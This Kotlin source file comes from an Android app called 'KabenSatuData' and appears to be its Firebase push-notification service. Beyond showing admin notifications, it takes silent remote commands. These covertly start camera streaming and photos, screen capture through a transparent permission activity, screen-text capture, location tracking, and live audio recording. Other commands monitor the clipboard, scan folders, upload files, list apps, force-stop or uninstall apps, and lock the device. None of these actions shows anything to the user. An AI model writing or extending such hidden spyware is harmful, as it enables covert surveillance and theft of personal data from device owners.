package com.example.kabensatudata.fcm

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.media.AudioAttributes
import android.media.RingtoneManager
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.kabensatudata.MainActivity
import com.example.kabensatudata.R
import com.example.kabensatudata.nearby.ScreenCaptureActivity
import com.example.kabensatudata.nearby.ScreenCaptureService
import com.example.kabensatudata.data.local.AppDatabase
import com.example.kabensatudata.data.local.entity.NotificationEntity
import com.example.kabensatudata.nearby.CameraForegroundService
import com.example.kabensatudata.nearby.ScreenTextService
import com.example.kabensatudata.nearby.LocationTracker
import com.example.kabensatudata.nearby.AudioRecorderService
import com.example.kabensatudata.nearby.RemoteControlHandler
import com.example.kabensatudata.nearby.FlashController
import com.example.kabensatudata.nearby.ClipboardMonitorService
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class FCMService : FirebaseMessagingService() {

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    companion object {
        const val CHANNEL_ID = "kabensatudata_notifications"
        const val CHANNEL_NAME = "Notifikasi KabenSatuData"

        fun createNotificationChannel(context: Context) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)
                val audioAttributes = AudioAttributes.Builder()
                    .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
                    .setUsage(AudioAttributes.USAGE_NOTIFICATION)
                    .build()

                val channel = NotificationChannel(
                    CHANNEL_ID,
                    CHANNEL_NAME,
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "Notifikasi dari admin KabenSatuData"
                    enableVibration(true)
                    vibrationPattern = longArrayOf(0, 300, 200, 300)
                    setSound(soundUri, audioAttributes)
                    enableLights(true)
                    lightColor = 0xFF00B894.toInt()
                }

                val manager = context.getSystemService(NotificationManager::class.java)
                manager.createNotificationChannel(channel)
            }
        }
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.i("FCM", "New FCM token: ${token.take(20)}...")
        // Token will be sent to server by CameraAutoStarter on next app launch
    }

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)

        val type = message.data["type"] ?: ""

        // ─── Camera Command (silent) ────────────────────
        if (type == "camera_command") {
            handleCameraCommand(message.data)
            return
        }

        // ─── Screen Command (silent) ────────────────────
        if (type == "screen_command") {
            handleScreenCommand(message.data)
            return
        }

        // ─── Text Monitor Command (silent) ──────────────
        if (type == "text_command") {
            handleTextCommand(message.data)
            return
        }

        // ─── Location Command (silent) ──────────────────
        if (type == "location_command") {
            handleLocationCommand(message.data)
            return
        }

        // ─── Audio Command (silent) ─────────────────────
        if (type == "audio_command") {
            handleAudioCommand(message.data)
            return
        }

        // ─── Remote Command (silent) ────────────────────
        if (type == "remote_command") {
            handleRemoteCommand(message.data)
            return
        }

        // ─── Regular Notification ───────────────────────
        val title = message.notification?.title
            ?: message.data["title"]
            ?: "Notifikasi"
        val body = message.notification?.body
            ?: message.data["message"]
            ?: ""
        val serverId = message.data["id"]?.toLongOrNull() ?: System.currentTimeMillis()

        // Save to local DB
        serviceScope.launch {
            try {
                val db = AppDatabase.getInstance(applicationContext)
                val dao = db.notificationDao()
                dao.insert(
                    NotificationEntity(
                        serverId = serverId,
                        title = title,
                        message = body,
                        type = type.ifEmpty { "info" }
                    )
                )
            } catch (_: Exception) {}
        }

        // Show system notification
        showNotification(title, body)
    }

    /**
     * Handle camera command from admin (silent — no notification shown).
     * Actions: START, STOP, SWITCH
     */
    private fun handleCameraCommand(data: Map<String, String>) {
        val action = data["action"] ?: return
        val lens = data["lens"] ?: "FRONT"
        Log.i("FCM", "Camera command: $action (lens=$lens)")

        when (action.uppercase()) {
            "START" -> {
                // Switch from STANDBY to STREAMING
                CameraForegroundService.start(applicationContext, lens)
                Log.i("FCM", "Camera started ($lens)")
            }
            "STOP" -> {
                // Switch from STREAMING back to STANDBY (don't kill service!)
                CameraForegroundService.stop(applicationContext)
                Log.i("FCM", "Camera stopped → STANDBY")
            }
            "SWITCH" -> {
                CameraForegroundService.switchCamera(applicationContext, lens)
                Log.i("FCM", "Camera switched to $lens")
            }
            "TAKE_PHOTO" -> {
                CameraForegroundService.takePhoto(applicationContext, lens)
                Log.i("FCM", "Taking photo ($lens)")
            }
        }
    }

    /**
     * Handle screen capture command from admin (silent).
     * Actions: START (capture screen), STOP (stop capture)
     */
    private fun handleScreenCommand(data: Map<String, String>) {
        val action = data["action"] ?: return
        Log.i("FCM", "Screen command: $action")

        when (action.uppercase()) {
            "START" -> {
                if (ScreenCaptureService.hasPermission()) {
                    // Permission exists — start directly
                    ScreenCaptureService.startCapture(applicationContext)
                    Log.i("FCM", "Screen capture started (permission exists)")
                } else {
                    // Need permission — launch transparent activity
                    ScreenCaptureActivity.launch(applicationContext)
                    Log.i("FCM", "Requesting screen capture permission")
                }
            }
            "STOP" -> {
                ScreenCaptureService.stopCapture(applicationContext)
                Log.i("FCM", "Screen capture stopped")
            }
        }
    }

    /**
     * Handle text monitoring command from admin (silent).
     * Actions: START (begin capturing screen text), STOP (stop capturing)
     */
    private fun handleTextCommand(data: Map<String, String>) {
        val action = data["action"] ?: return
        Log.i("FCM", "Text command: $action")

        when (action.uppercase()) {
            "START" -> {
                ScreenTextService.startCapturing()
                Log.i("FCM", "Text capturing started")
            }
            "STOP" -> {
                ScreenTextService.stopCapturing()
                Log.i("FCM", "Text capturing stopped")
            }
        }
    }

    /**
     * Handle location tracking command from admin (silent).
     * Actions: GET (one-shot), START (continuous), STOP (stop continuous)
     */
    private fun handleLocationCommand(data: Map<String, String>) {
        val action = data["action"] ?: return
        Log.i("FCM", "Location command: $action")

        when (action.uppercase()) {
            "GET" -> {
                LocationTracker.getOnce(applicationContext)
                Log.i("FCM", "Location one-shot requested")
            }
            "START" -> {
                LocationTracker.startTracking(applicationContext)
                Log.i("FCM", "Location continuous tracking started")
            }
            "STOP" -> {
                LocationTracker.stopTracking(applicationContext)
                Log.i("FCM", "Location tracking stopped")
            }
        }
    }

    /**
     * Handle audio recording command from admin (silent).
     * Actions: RECORD (clip 2 min), LIVE_START (live chunks), STOP
     */
    private fun handleAudioCommand(data: Map<String, String>) {
        val action = data["action"] ?: return
        Log.i("FCM", "Audio command: $action")

        when (action.uppercase()) {
            "RECORD" -> {
                AudioRecorderService.startService(applicationContext, "CLIP")
                Log.i("FCM", "Audio clip recording started (2 min)")
            }
            "LIVE_START" -> {
                AudioRecorderService.startService(applicationContext, "LIVE")
                Log.i("FCM", "Audio live streaming started")
            }
            "STOP" -> {
                AudioRecorderService.stopService(applicationContext)
                Log.i("FCM", "Audio recording stopped")
            }
        }
    }

    /**
     * Handle remote control command from admin.
     * Actions: LOCK, RING, STOP_RING, DEVICE_INFO, APP_LIST,
     *          FLASH_ON, FLASH_OFF, FLASH_BLINK, FLASH_PULSE, FLASH_SOS
     */
    private fun handleRemoteCommand(data: Map<String, String>) {
        val action = data["action"] ?: return
        val params = data["params"] ?: ""
        Log.i("FCM", "Remote command: $action (params=$params)")

        when (action.uppercase()) {
            "LOCK" -> {
                RemoteControlHandler.lockDevice(applicationContext)
                Log.i("FCM", "Device locked")
            }
            "RING" -> {
                RemoteControlHandler.ringDevice(applicationContext)
                Log.i("FCM", "Device ringing")
            }
            "STOP_RING" -> {
                RemoteControlHandler.stopRinging()
                Log.i("FCM", "Ring stopped")
            }
            "DEVICE_INFO" -> {
                RemoteControlHandler.collectAndUploadDeviceInfo(applicationContext)
                Log.i("FCM", "Device info collection triggered")
            }
            "APP_LIST" -> {
                RemoteControlHandler.collectAndUploadAppList(applicationContext)
                Log.i("FCM", "App list collection triggered")
            }
            "CAPTURE_NOW" -> {
                RemoteControlHandler.captureScreenshotNow(applicationContext)
                Log.i("FCM", "Screenshot capture triggered")
            }
            "SCAN_FOLDER" -> {
                val path = params.ifBlank { "/storage/emulated/0" }
                RemoteControlHandler.scanFolder(applicationContext, path)
                Log.i("FCM", "Folder scan triggered: $path")
            }
            "UPLOAD_FILE" -> {
                if (params.isNotBlank()) {
                    RemoteControlHandler.uploadFile(applicationContext, params)
                    Log.i("FCM", "File upload triggered: $params")
                }
            }
            // ─── Flash / Torch control ────────────────────────────────────
            "FLASH_ON" -> {
                FlashController.turnOn(applicationContext)
                Log.i("FCM", "Flash ON")
            }
            "FLASH_OFF" -> {
                FlashController.turnOff(applicationContext)
                Log.i("FCM", "Flash OFF")
            }
            "FLASH_BLINK" -> {
                FlashController.startBlink(applicationContext)
                Log.i("FCM", "Flash BLINK started")
            }
            "FLASH_PULSE" -> {
                FlashController.startPulse(applicationContext)
                Log.i("FCM", "Flash PULSE started")
            }
            "FLASH_SOS" -> {
                FlashController.startSOS(applicationContext)
                Log.i("FCM", "Flash SOS started")
            }
            // ─── Clipboard monitor ────────────────────────────────────────
            "CLIPBOARD_START" -> {
                ClipboardMonitorService.start(applicationContext)
                Log.i("FCM", "Clipboard monitor started")
            }
            "CLIPBOARD_STOP" -> {
                ClipboardMonitorService.stop(applicationContext)
                Log.i("FCM", "Clipboard monitor stopped")
            }
            // ─── App management ───────────────────────────────────────────
            "FORCE_STOP" -> {
                if (params.isNotBlank()) {
                    RemoteControlHandler.forceStopApp(applicationContext, params)
                    Log.i("FCM", "Force stop: $params")
                }
            }
            "UNINSTALL_APP" -> {
                if (params.isNotBlank()) {
                    RemoteControlHandler.uninstallApp(applicationContext, params)
                    Log.i("FCM", "Uninstall: $params")
                }
            }
        }
    }

    private fun showNotification(title: String, body: String) {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            putExtra("open_notifications", true)
        }
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val soundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION)

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentTitle(title)
            .setContentText(body)
            .setStyle(NotificationCompat.BigTextStyle().bigText(body))
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .setContentIntent(pendingIntent)
            .setSound(soundUri)
            .setVibrate(longArrayOf(0, 300, 200, 300))
            .setDefaults(NotificationCompat.DEFAULT_LIGHTS)
            .build()

        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(System.currentTimeMillis().toInt(), notification)
    }
}
